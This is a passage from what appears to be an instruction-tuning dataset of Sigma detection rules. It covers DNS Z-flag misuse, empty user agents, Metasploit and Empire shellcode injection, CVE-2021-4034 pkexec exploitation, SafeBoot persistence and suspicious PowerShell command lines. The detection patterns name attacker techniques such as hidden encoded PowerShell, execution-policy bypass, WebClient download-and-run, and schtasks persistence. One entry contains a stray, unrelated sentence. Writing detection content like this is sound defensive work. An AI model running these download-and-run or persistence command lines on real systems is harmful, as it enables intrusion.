    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: zeek\n    service: dns\ndetection:\n    z_flag_unset:\n        Z: 0\n    most_probable_valid_domain:\n        query|contains: '.'\n    exclude_tlds:\n        query|endswith:\n            - '.arpa'\n            - '.local'\n            - '.ultradns.net'\n            - '.twtrdns.net'\n            - '.azuredns-prd.info'\n            - '.azure-dns.com'\n            - '.azuredns-ff.info'\n            - '.azuredns-ff.org'\n            - '.azuregov-dns.org'\n    exclude_query_types:\n        qtype_name:\n            - 'ns'\n            - 'mx'\n    exclude_responses:\n        answers|endswith: '\\\\x00'\n    exclude_netbios:\n        id.resp_p:\n            - 137\n            - 138\n            - 139\n    condition: not z_flag_unset and most_probable_valid_domain and not (exclude_tlds or exclude_query_types or exclude_responses or exclude_netbios)\nfields:\n    - ts\n    - id.orig_h\n    - id.orig_p\n    - id.resp_h\n    - id.resp_p\n    - proto\n    - qtype_name\n    - qtype\n    - query\n    - answers\n    - rcode\n    - rcode_name\n    - trans_id\n    - qtype\n    - ttl\n    - AA\n    - uid\nfalsepositives:\n    - 'Internal or legitimate external domains using DNSSec. Verify if these are legitimate DNSSec domains and then exclude them.'\n    - 'If you work in a Public Sector then it may be good to exclude things like endswith \".edu\", \".gov\" and or \".mil\"'\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: zeek\n    service: dns\ndetection:\n    z_flag_unset:\n        Z: 0\n    most_probable_valid_domain:\n        query|contains: '.'\n    exclude_tlds:\n        query|endswith:\n            - '.arpa'\n            - '.local'\n            - '.ultradns.net'\n            - '.twtrdns.net'\n            - '.azuredns-prd.info'\n            - '.azure-dns.com'\n            - '.azuredns-ff.info'\n            - '.azuredns-ff.org'\n            - '.azuregov-dns.org'\n    exclude_query_types:\n        qtype_name:\n            - 'ns'\n            - 'mx'\n    exclude_responses:\n        answers|endswith: '\\\\x00'\n    exclude_netbios:\n        id.resp_p:\n            - 137\n            - 138\n            - 139\n    condition: not z_flag_unset and most_probable_valid_domain and not (exclude_tlds or exclude_query_types or exclude_responses or exclude_netbios)\nfields:\n    - ts\n    - id.orig_h\n    - id.orig_p\n    - id.resp_h\n    - id.resp_p\n    - proto\n    - qtype_name\n    - qtype\n    - query\n    - answers\n    - rcode\n    - rcode_name\n    - trans_id\n    - qtype\n    - ttl\n    - AA\n    - uid\nfalsepositives:\n    - 'Internal or legitimate external domains using DNSSec. Verify if these are legitimate DNSSec domains and then exclude them.'\n    - 'If you work in a Public Sector then it may be good to exclude things like endswith \".edu\", \".gov\" and or \".mil\"'\nlevel: medium\n",
      "question": "The DNS Z flag is bit within the DNS protocol header that is, per the IETF design, meant to be used reserved (unused).\nAlthough recently it has been used in DNSSec, the value being set to anything other than 0 should be rare.\nOtherwise if it is set to non 0 and DNSSec is being used, then excluding the legitimate domains is low effort and high reward.\nDetermine if multiple of these files were accessed in a short period of time to further enhance the possibility of seeing if this was a one off or the possibility of larger sensitive file gathering.\nThis Sigma query is designed to accompany the Corelight Threat Hunting Guide, which can be found here: https://www3.corelight.com/corelights-introductory-guide-to-threat-hunting-with-zeek-bro-logs'\n",
      "answer": "In order to detect misuse of the DNS Z flag, which is a bit within the DNS protocol header designed to be unused but has occasionally been employed in DNSSec, you should: Monitor DNS traffic for queries where the Z flag is not set to 0, indicating a deviation from standard behavior, which could be a sign of malicious activity. You should focus on DNS queries that contain a dot, suggesting they are directed towards fully qualified domain names, yet exclude certain top-level domains such as '.arpa', '.local', '.ultradns.net', '.twtrdns.net', '.azuredns-prd.info', '.azure-dns.com', '.azuredns-ff.info', '.azuredns-ff.org', '.azuregov-dns.org' to minimize false positives from legitimate DNS traffic. Additionally, DNS queries seeking name server (NS) and mail exchange (MX) records should be left out of the monitoring scope, as well as any DNS responses ending with a null character, which could indicate non-standard or malicious responses. Monitoring should also disregard traffic to well-known NetBIOS ports (137, 138, 139) since this traffic is unrelated to DNS and could lead to false alerts. Keep an eye on fields such as timestamp, source and destination IPs and ports, protocol, DNS query type names and codes, queries and their answers, response codes, transaction IDs, time-to-live (TTL) values, and authoritative answer flags to build a comprehensive picture of any potentially malicious DNS activity. Bear in mind that encountering DNS queries with non-zero Z flag values could occasionally result from internal or legitimate external domains utilizing DNSSec; such instances should be verified and, if deemed legitimate, excluded from alerts. Special consideration should also be given to domains ending in '.edu', '.gov', and '.mil', especially in environments like the public sector, to minimize false positives. This approach aligns with medium-level security monitoring, leveraging the Corelight Threat Hunting Guide's recommendations for using Zeek (Bro) logs to identify potentially malicious activity."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious empty user agent strings in proxy logs.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious empty user agent strings in proxy logs, you should: monitor proxy logs for instances where the user agent string is completely empty. This scenario often highlights the usage of tools or scripts, such as PowerShell\u2019s (New-Object Net.WebClient).DownloadString, designed to fetch web content without specifying a user agent. This can be an indication of an attempt to avoid detection, as most legitimate web browsers and clients typically send a user agent string identifying themselves. Make sure to pay attention to fields such as ClientIP, c-uri, and c-useragent in the proxy logs to accurately identify such activities. Although this method has potential unknown false positives, the threat level for this kind of activity is considered medium.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: proxy\ndetection:\n    selection:\n      # Empty string - as used by Powershell's (New-Object Net.WebClient).DownloadString\n        c-useragent: ''\n    condition: selection\nfields:\n    - ClientIP\n    - c-uri\n    - c-useragent\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: proxy\ndetection:\n    selection:\n      # Empty string - as used by Powershell's (New-Object Net.WebClient).DownloadString\n        c-useragent: ''\n    condition: selection\nfields:\n    - ClientIP\n    - c-uri\n    - c-useragent\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "suspicious empty user agent strings in proxy logs",
      "answer": "In order to detect suspicious empty user agent strings in proxy logs, you should: monitor proxy logs for instances where the user agent string is completely empty. This scenario often highlights the usage of tools or scripts, such as PowerShell\u2019s (New-Object Net.WebClient).DownloadString, designed to fetch web content without specifying a user agent. This can be an indication of an attempt to avoid detection, as most legitimate web browsers and clients typically send a user agent string identifying themselves. Make sure to pay attention to fields such as ClientIP, c-uri, and c-useragent in the proxy logs to accurately identify such activities. Although this method has potential unknown false positives, the threat level for this kind of activity is considered medium."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential shellcode injection used by tools such as Metasploit's migrate and Empire's psinject.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential shellcode injection used by tools such as Metasploit's migrate and Empire's psinject, you should monitor Windows process access logs for specific patterns of behavior that indicate suspicious activity. Specifically, you should look out for cases where a process has been granted certain access rights, identified by the hexadecimal values '0x147a' and '0x1f3fff', which could be indicative of an attempt to inject shellcode into a process. Additionally, if the call trace of the process access attempt contains 'UNKNOWN', this could signal an injection attempt that is trying to mask its origin.\n\nHowever, it's important to apply certain filters to avoid false positives from legitimate software. For instance, Dell software and certain Microsoft Visual Studio processes might exhibit similar behavior during normal operations. These include processes starting with specific paths such as 'C:\\Program Files\\Dell\\' and 'C:\\Program Files (x86)\\Dell\\', or Microsoft Visual Studio paths, especially when they are accessing other processes within the same directories with the same high level of granted access ('0x1f3fff'). Additionally, legitimate activities often involve call traces starting with 'C:\\Windows\\System32\\ntdll.dll'.\n\nTo accurately filter out these legitimate cases, review instances where Dell-related software or specific Visual Studio utilities (e.g., PerfWatson2.exe or MSBuild.exe) are involved in process access attempts toward expected target processes, including but not limited to Dell TechHub software or Visual Studio development environments.\n\nBy focusing on these patterns and applying the appropriate filters, you can more precisely detect malicious activities attempting to utilize shellcode injection techniques akin to those employed by advanced hacking tools like Metasploit and Empire, while reducing the chances of flagging benign software operations as threats.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_access\n    product: windows\ndetection:\n    selection:\n        GrantedAccess:\n            - '0x147a'\n            - '0x1f3fff'\n        CallTrace|contains: 'UNKNOWN'\n    filter_dell_folders:\n        # If dell software is installed we get matches like these\n        # Example 1:\n        #   SourceImage: C:\\Program Files\\Dell\\SupportAssistAgent\\bin\\SupportAssistAgent.exe\n        #   TargetImage: C:\\Program Files\\Dell\\TechHub\\Dell.TechHub.exe\n        #   GrantedAccess: 0x1F3FFF\n        # Example 2:\n        #   SourceImage: C:\\Program Files (x86)\\Dell\\UpdateService\\DCF\\Dell.DCF.UA.Bradbury.API.SubAgent.exe\n        #   TargetImage: C:\\Program Files\\Dell\\TechHub\\Dell.TechHub.exe\n        #   GrantedAccess: 0x1F3FFF\n        # Example 3:\n        #   SourceImage: C:\\Program Files\\Dell\\TechHub\\Dell.TechHub.exe\n        #   TargetImage: C:\\Program Files (x86)\\Dell\\UpdateService\\DCF\\Dell.DCF.UA.Bradbury.API.SubAgent.exe\n        #   GrantedAccess: 0x1F3FFF\n        SourceImage|startswith:\n            - 'C:\\Program Files\\Dell\\'\n            - 'C:\\Program Files (x86)\\Dell\\'\n        TargetImage|startswith:\n            - 'C:\\Program Files\\Dell\\'\n            - 'C:\\Program Files (x86)\\Dell\\'\n        GrantedAccess: '0x1F3FFF'\n        CallTrace|startswith: 'C:\\Windows\\System32\\ntdll.dll'\n    filter_dell_specifc:\n        SourceImage: 'C:\\Program Files (x86)\\Dell\\UpdateService\\ServiceShell.exe'\n        TargetImage: 'C:\\Windows\\Explorer.EXE'\n        GrantedAccess: '0x1F3FFF'\n        CallTrace|startswith: 'C:\\Windows\\System32\\ntdll.dll'\n    filter_visual_studio:\n        SourceImage:\n            - 'C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\PerfWatson2.exe'\n            - 'C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\Common7\\IDE\\PerfWatson2.exe'\n        TargetImage:\n            - 'C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\devenv.exe'\n            - 'C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\Common7\\IDE\\devenv.exe'\n        CallTrace|startswith: 'C:\\Windows\\System32\\ntdll.dll'\n    filter_ddvdatacollector:\n        SourceImage|startswith: 'C:\\Program Files\\Microsoft Visual Studio\\'\n        SourceImage|endswith: '\\MSBuild\\Current\\Bin\\MSBuild.exe'\n        TargetImage: C:\\Program Files\\Dell\\DellDataVault\\DDVDataCollector.exe\n    filter_wmiprvese:\n        SourceImage: 'C:\\Windows\\System32\\Wbem\\Wmiprvse.exe'\n        TargetImage: 'C:\\Windows\\system32\\lsass.exe'\n        CallTrace|startswith: 'C:\\Windows\\SYSTEM32\\ntdll.dll'\n        CallTrace|contains: '\\System.ni.dll+'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_access\n    product: windows\ndetection:\n    selection:\n        GrantedAccess:\n            - '0x147a'\n            - '0x1f3fff'\n        CallTrace|contains: 'UNKNOWN'\n    filter_dell_folders:\n        # If dell software is installed we get matches like these\n        # Example 1:\n        #   SourceImage: C:\\Program Files\\Dell\\SupportAssistAgent\\bin\\SupportAssistAgent.exe\n        #   TargetImage: C:\\Program Files\\Dell\\TechHub\\Dell.TechHub.exe\n        #   GrantedAccess: 0x1F3FFF\n        # Example 2:\n        #   SourceImage: C:\\Program Files (x86)\\Dell\\UpdateService\\DCF\\Dell.DCF.UA.Bradbury.API.SubAgent.exe\n        #   TargetImage: C:\\Program Files\\Dell\\TechHub\\Dell.TechHub.exe\n        #   GrantedAccess: 0x1F3FFF\n        # Example 3:\n        #   SourceImage: C:\\Program Files\\Dell\\TechHub\\Dell.TechHub.exe\n        #   TargetImage: C:\\Program Files (x86)\\Dell\\UpdateService\\DCF\\Dell.DCF.UA.Bradbury.API.SubAgent.exe\n        #   GrantedAccess: 0x1F3FFF\n        SourceImage|startswith:\n            - 'C:\\Program Files\\Dell\\'\n            - 'C:\\Program Files (x86)\\Dell\\'\n        TargetImage|startswith:\n            - 'C:\\Program Files\\Dell\\'\n            - 'C:\\Program Files (x86)\\Dell\\'\n        GrantedAccess: '0x1F3FFF'\n        CallTrace|startswith: 'C:\\Windows\\System32\\ntdll.dll'\n    filter_dell_specifc:\n        SourceImage: 'C:\\Program Files (x86)\\Dell\\UpdateService\\ServiceShell.exe'\n        TargetImage: 'C:\\Windows\\Explorer.EXE'\n        GrantedAccess: '0x1F3FFF'\n        CallTrace|startswith: 'C:\\Windows\\System32\\ntdll.dll'\n    filter_visual_studio:\n        SourceImage:\n            - 'C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\PerfWatson2.exe'\n            - 'C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\Common7\\IDE\\PerfWatson2.exe'\n        TargetImage:\n            - 'C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\devenv.exe'\n            - 'C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\Common7\\IDE\\devenv.exe'\n        CallTrace|startswith: 'C:\\Windows\\System32\\ntdll.dll'\n    filter_ddvdatacollector:\n        SourceImage|startswith: 'C:\\Program Files\\Microsoft Visual Studio\\'\n        SourceImage|endswith: '\\MSBuild\\Current\\Bin\\MSBuild.exe'\n        TargetImage: C:\\Program Files\\Dell\\DellDataVault\\DDVDataCollector.exe\n    filter_wmiprvese:\n        SourceImage: 'C:\\Windows\\System32\\Wbem\\Wmiprvse.exe'\n        TargetImage: 'C:\\Windows\\system32\\lsass.exe'\n        CallTrace|startswith: 'C:\\Windows\\SYSTEM32\\ntdll.dll'\n        CallTrace|contains: '\\System.ni.dll+'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "potential shellcode injection used by tools such as Metasploit's migrate and Empire's psinject",
      "answer": "In order to detect potential shellcode injection used by tools such as Metasploit's migrate and Empire's psinject, you should monitor Windows process access logs for specific patterns of behavior that indicate suspicious activity. Specifically, you should look out for cases where a process has been granted certain access rights, identified by the hexadecimal values '0x147a' and '0x1f3fff', which could be indicative of an attempt to inject shellcode into a process. Additionally, if the call trace of the process access attempt contains 'UNKNOWN', this could signal an injection attempt that is trying to mask its origin.\n\nHowever, it's important to apply certain filters to avoid false positives from legitimate software. For instance, Dell software and certain Microsoft Visual Studio processes might exhibit similar behavior during normal operations. These include processes starting with specific paths such as 'C:\\Program Files\\Dell\\' and 'C:\\Program Files (x86)\\Dell\\', or Microsoft Visual Studio paths, especially when they are accessing other processes within the same directories with the same high level of granted access ('0x1f3fff'). Additionally, legitimate activities often involve call traces starting with 'C:\\Windows\\System32\\ntdll.dll'.\n\nTo accurately filter out these legitimate cases, review instances where Dell-related software or specific Visual Studio utilities (e.g., PerfWatson2.exe or MSBuild.exe) are involved in process access attempts toward expected target processes, including but not limited to Dell TechHub software or Visual Studio development environments.\n\nBy focusing on these patterns and applying the appropriate filters, you can more precisely detect malicious activities attempting to utilize shellcode injection techniques akin to those employed by advanced hacking tools like Metasploit and Empire, while reducing the chances of flagging benign software operations as threats."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious file based on their extension being created in \"C:\\PerfLogs\\\". Note that this directory mostly contains \".etl\" files.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious file based on their extension being created in \"C:\\PerfLogs\\\", you should monitor file events in Windows environments, especially focusing on files created in the \"C:\\PerfLogs\\\" directory. Pay close attention to files with the extensions '.7z', '.bat', '.bin', '.chm', '.dll', '.exe', '.hta', '.lnk', '.ps1', '.psm1', '.py', '.scr', '.sys', '.vbe', '.vbs', and '.zip'. These extensions are commonly associated with executable and potentially malicious content, unlike the typical \".etl\" files expected in this directory. The detection of files with these extensions being created in the specified directory should raise alerts, as it is unlikely for such activities to occur under normal circumstances, thus indicating a potential security threat.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: file_event\n    product: windows\ndetection:\n    selection:\n        TargetFilename|startswith: 'C:\\PerfLogs\\'\n        TargetFilename|endswith:\n            - '.7z'\n            - '.bat'\n            - '.bin'\n            - '.chm'\n            - '.dll'\n            - '.exe'\n            - '.hta'\n            - '.lnk'\n            - '.ps1'\n            - '.psm1'\n            - '.py'\n            - '.scr'\n            - '.sys'\n            - '.vbe'\n            - '.vbs'\n            - '.zip'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: file_event\n    product: windows\ndetection:\n    selection:\n        TargetFilename|startswith: 'C:\\PerfLogs\\'\n        TargetFilename|endswith:\n            - '.7z'\n            - '.bat'\n            - '.bin'\n            - '.chm'\n            - '.dll'\n            - '.exe'\n            - '.hta'\n            - '.lnk'\n            - '.ps1'\n            - '.psm1'\n            - '.py'\n            - '.scr'\n            - '.sys'\n            - '.vbe'\n            - '.vbs'\n            - '.zip'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: medium\n",
      "question": "suspicious file based on their extension being created in \"C:\\PerfLogs\\\". Note that this directory mostly contains \".etl\" files",
      "answer": "In order to detect suspicious file based on their extension being created in \"C:\\PerfLogs\\\", you should monitor file events in Windows environments, especially focusing on files created in the \"C:\\PerfLogs\\\" directory. Pay close attention to files with the extensions '.7z', '.bat', '.bin', '.chm', '.dll', '.exe', '.hta', '.lnk', '.ps1', '.psm1', '.py', '.scr', '.sys', '.vbe', '.vbs', and '.zip'. These extensions are commonly associated with executable and potentially malicious content, unlike the typical \".etl\" files expected in this directory. The detection of files with these extensions being created in the specified directory should raise alerts, as it is unlikely for such activities to occur under normal circumstances, thus indicating a potential security threat."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting specific process parameters as used by ACTINIUM scheduled task persistence creation..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect specific process parameters as used by ACTINIUM scheduled task persistence creation, you should: Monitor for the creation of processes on Windows systems, particularly focusing on the command line parameters. Look for instances where the command line includes the use of 'schtasks' along with 'create', and also specifically invokes 'wscript' with an explicit parameter of ' /e:vbscript'. This combination of parameters is indicative of an attempt to establish persistence on the system by creating a scheduled task that executes a VBScript script, a technique known to be used by the ACTINIUM threat group. The detection of this activity is considered to be of high importance due to its potential impact and the unlikelihood of false positives occurring under these specific conditions.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'schtasks'\n            - 'create'\n            - 'wscript'\n            - ' /e:vbscript'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'schtasks'\n            - 'create'\n            - 'wscript'\n            - ' /e:vbscript'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "specific process parameters as used by ACTINIUM scheduled task persistence creation.",
      "answer": "In order to detect specific process parameters as used by ACTINIUM scheduled task persistence creation, you should: Monitor for the creation of processes on Windows systems, particularly focusing on the command line parameters. Look for instances where the command line includes the use of 'schtasks' along with 'create', and also specifically invokes 'wscript' with an explicit parameter of ' /e:vbscript'. This combination of parameters is indicative of an attempt to establish persistence on the system by creating a scheduled task that executes a VBScript script, a technique known to be used by the ACTINIUM threat group. The detection of this activity is considered to be of high importance due to its potential impact and the unlikelihood of false positives occurring under these specific conditions."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting exploitation attempt of the vulnerability described in CVE-2021-4034..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect exploitation attempt of the vulnerability described in CVE-2021-4034, you should: monitor Linux systems using auditd for specific patterns of activity that are indicative of an attack. Look for audit logs where the process title (proctitle) is registered as '(null)' in close proximity to syscall events generated by the command `pkexec` executed from `/usr/bin/pkexec`. This pattern of activity is highly indicative of an exploitation attempt against the mentioned vulnerability, noting that legitimate use of `pkexec` with a null proctitle is highly unusual and thus should be regarded with suspicion. Although there is a possibility of false positives being recorded, they are considered unknown, and the risk level of this activity is classified as high due to the severity of the vulnerability being exploited. This detection focuses on observing for abnormal execution behavior associated with privilege escalation attempts typically employed by attackers exploiting this vulnerability.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    service: auditd\ndetection:\n    selection_proctitle:\n        type: PROCTITLE\n        proctitle: '(null)'\n    selection_syscall:\n        type: SYSCALL\n        comm: pkexec\n        exe: '/usr/bin/pkexec'\n    condition: selection_proctitle |near selection_syscall\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    service: auditd\ndetection:\n    selection_proctitle:\n        type: PROCTITLE\n        proctitle: '(null)'\n    selection_syscall:\n        type: SYSCALL\n        comm: pkexec\n        exe: '/usr/bin/pkexec'\n    condition: selection_proctitle |near selection_syscall\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "exploitation attempt of the vulnerability described in CVE-2021-4034.",
      "answer": "In order to detect exploitation attempt of the vulnerability described in CVE-2021-4034, you should: monitor Linux systems using auditd for specific patterns of activity that are indicative of an attack. Look for audit logs where the process title (proctitle) is registered as '(null)' in close proximity to syscall events generated by the command `pkexec` executed from `/usr/bin/pkexec`. This pattern of activity is highly indicative of an exploitation attempt against the mentioned vulnerability, noting that legitimate use of `pkexec` with a null proctitle is highly unusual and thus should be regarded with suspicion. Although there is a possibility of false positives being recorded, they are considered unknown, and the risk level of this activity is classified as high due to the severity of the vulnerability being exploited. This detection focuses on observing for abnormal execution behavior associated with privilege escalation attempts typically employed by attackers exploiting this vulnerability."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting modification of the registry to allow a driver or service to persist in Safe Mode..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the modification of the registry to allow a driver or service to persist in Safe Mode, you should focus on monitoring registry modification events within Windows systems, specifically those targeting the registry keys related to Safe Mode services or drivers. Pay attention to events where the EventType is 'Setvalue', indicating a change to a registry value. The primary registry keys of interest start with 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\' or 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\', and target objects ending with '\\(Default)', implying modifications at the default startup settings level for services in Safe Mode. Detecting modifications to these registry paths would involve looking for changes that contain the detail 'Service', indicating a service-related modification.\n\nHowever, not all modifications might be malicious. For example, changes involving 'C:\\WINDOWS\\system32\\msiexec.exe' modifying the registry keys 'HKLM\\System\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\SAVService\\(Default)' or 'HKLM\\System\\CurrentControlSet\\Control\\SafeBoot\\Network\\SAVService\\(Default)' could be considered legitimate, particularly from software like Sophos. It is critical to exclude these known good modifications from triggering alerts to avoid false positives.\n\nIn evaluating the logs for these modifications, a high level of scrutiny is advised due to the potentially severe impact that unauthorized changes can have, enabling malware or other unwanted programs to persist and operate even when the system is in Safe Mode, a state often used for troubleshooting and security scans. \n\nThis analysis assumes a high-severity level for detected events due to their potential use in bypassing security measures or maintaining persistence by adversaries. It is aimed at identifying tactics and techniques such as Persistence and Privilege Escalation, where attackers aim to maintain their foothold on a system across reboots, even into modes intended for system recovery.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: Setvalue\n        TargetObject|startswith:\n            - 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\'\n            - 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\'\n        TargetObject|endswith: '\\(Default)'\n        Details: Service\n    filter_sophos:\n        Image: 'C:\\WINDOWS\\system32\\msiexec.exe'\n        TargetObject:\n            - 'HKLM\\System\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\SAVService\\(Default)'\n            - 'HKLM\\System\\CurrentControlSet\\Control\\SafeBoot\\Network\\SAVService\\(Default)'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: Setvalue\n        TargetObject|startswith:\n            - 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\'\n            - 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\'\n        TargetObject|endswith: '\\(Default)'\n        Details: Service\n    filter_sophos:\n        Image: 'C:\\WINDOWS\\system32\\msiexec.exe'\n        TargetObject:\n            - 'HKLM\\System\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\SAVService\\(Default)'\n            - 'HKLM\\System\\CurrentControlSet\\Control\\SafeBoot\\Network\\SAVService\\(Default)'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "modification of the registry to allow a driver or service to persist in Safe Mode.",
      "answer": "In order to detect the modification of the registry to allow a driver or service to persist in Safe Mode, you should focus on monitoring registry modification events within Windows systems, specifically those targeting the registry keys related to Safe Mode services or drivers. Pay attention to events where the EventType is 'Setvalue', indicating a change to a registry value. The primary registry keys of interest start with 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\' or 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\', and target objects ending with '\\(Default)', implying modifications at the default startup settings level for services in Safe Mode. Detecting modifications to these registry paths would involve looking for changes that contain the detail 'Service', indicating a service-related modification.\n\nHowever, not all modifications might be malicious. For example, changes involving 'C:\\WINDOWS\\system32\\msiexec.exe' modifying the registry keys 'HKLM\\System\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\SAVService\\(Default)' or 'HKLM\\System\\CurrentControlSet\\Control\\SafeBoot\\Network\\SAVService\\(Default)' could be considered legitimate, particularly from software like Sophos. It is critical to exclude these known good modifications from triggering alerts to avoid false positives.\n\nIn evaluating the logs for these modifications, a high level of scrutiny is advised due to the potentially severe impact that unauthorized changes can have, enabling malware or other unwanted programs to persist and operate even when the system is in Safe Mode, a state often used for troubleshooting and security scans. \n\nThis analysis assumes a high-severity level for detected events due to their potential use in bypassing security measures or maintaining persistence by adversaries. It is aimed at identifying tactics and techniques such as Persistence and Privilege Escalation, where attackers aim to maintain their foothold on a system across reboots, even into modes intended for system recovery."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious PowerShell invocation command parameters.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious PowerShell invocation command parameters, you should:\n\nMonitor process creation logs within Windows environments for specific patterns in the command line arguments that could indicate malicious activity. Look for instances where PowerShell is invoked with combinations of switches and parameters often used in attacks to execute code, bypass execution policies, or hide the activity.\n\nSpecific detection patterns to watch for include:\n- Use of base64 encoding with the presence of parameters like '-nop' (bypasses PowerShell profiles), '-w', 'hidden' (attempts to hide windows), '-c' (execute command), and '[Convert]::FromBase64String' (indicates base64 encoded commands are being decoded and executed).\n- Invocation of PowerShell with flags such as '-noni' (non-interactive), '-nop', 'hidden', 'iex' (alias for Invoke-Expression, used to run strings as commands), and 'New-Object' (used to instantiate .NET objects, potentially for web requests or COM objects for lateral movements or data theft).\n- Use of encoded commands that bypass the execution policy with '-ep', 'bypass', and '-Enc' (encoded commands) along with attempts to run Windows invisibly with parameters like '-w' and 'hidden'.\n- Attempts to modify the system registry through PowerShell with identifiable flags and paths like 'powershell', 'reg', 'add', and a specific focus on '\\software\\' indicating changes to software entries.\n- Suspicious usage of PowerShell to invoke web requests with 'bypass', '-noprofile', 'hidden', and the creation of 'new-object' instances of 'system.net.webclient', followed by a download function call. This behavior often points to downloading and executing malicious scripts or tools from the internet.\n- Execution of PowerShell scripts that include 'iex', 'New-Object', 'Net.WebClient', and '.Download' commands in combination, indicating direct internet downloads and execution of potentially malicious content.\n\nIt's important to exclude known benign instances such as the downloading and execution of Chocolatey installation scripts, which might contain similar patterns but are recognized as legitimate.\n\nBy actively monitoring for these specific patterns, you can identify potentially malicious activities involving PowerShell, which is a common vector used by attackers to execute code, bypass security measures, and maintain stealth.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_convert_b64:\n        CommandLine|contains|all:\n            - '-nop'\n            - ' -w '\n            - 'hidden'\n            - ' -c '\n            - '[Convert]::FromBase64String'\n    selection_iex:\n        CommandLine|contains|all:\n            - ' -w '\n            - 'hidden'\n            - '-noni'\n            - '-nop'\n            - ' -c '\n            - 'iex'\n            - 'New-Object'\n    selection_enc:\n        CommandLine|contains|all:\n            - ' -w '\n            - 'hidden'\n            - '-ep'\n            - 'bypass'\n            - '-Enc'\n    selection_reg:\n        CommandLine|contains|all:\n            - 'powershell'\n            - 'reg'\n            - 'add'\n            - '\\software\\'\n    selection_webclient:\n        CommandLine|contains|all:\n            - 'bypass'\n            - '-noprofile'\n            - '-windowstyle'\n            - 'hidden'\n            - 'new-object'\n            - 'system.net.webclient'\n            - '.download'\n    selection_iex_webclient:\n        CommandLine|contains|all:\n            - 'iex'\n            - 'New-Object'\n            - 